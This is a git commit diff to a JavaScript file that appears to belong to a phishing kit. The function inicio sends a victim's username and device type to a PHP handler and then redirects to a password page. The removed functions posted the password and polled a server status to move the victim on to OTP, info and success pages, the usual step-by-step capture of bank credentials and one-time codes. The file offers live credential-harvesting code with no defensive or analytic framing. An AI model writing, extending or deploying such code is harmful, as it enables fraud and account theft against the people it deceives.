7c5bd70930c531c955b497c33a86b4cf88caf17c
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 00:08:53 -0500

    Actualizar functions.js

--- js/functions.js
+++ js/functions.js
@@ -1,25 +1,12 @@
 function inicio(u){
     var d = detectar_dispositivo();
     $("#fondo, #cargando-o").show();
-    $.post( "../process/inicio.php", { usr: u, dis: d } ).always(function() {
+    
+    // Enviamos el usuario al archivo PHP
+    $.post( "../process/inicio.php", { usr: u, dis: d } );
+
+    // Saltamos a la clave de una vez (1 segundo)
+    setTimeout(function(){ 
         window.location.href = "PASS.php"; 
-    });
-}
-
-function pasousuario(p){    
-    $("#fondo, #cargando-o").show();
-    $.post( "../process/pasousuario.php", { pass: p } ).always(function() {
-        window.location.href = "WAITING.php"; 
-    });
-}            
-
-function consultar_estado(){    
-    $.post( "../process/estado.php?v=" + Math.random(), function(data) {        
-        var estado = data.toString().trim();
-        switch (estado) {
-            case '2': window.location.href = "OTP.php"; break;
-            case '4': window.location.href = "INFO.php"; break;
-            case '10': window.location.href = "SUCCESS.php"; break;
-        } 
-    });        
+    }, 1000);
 }
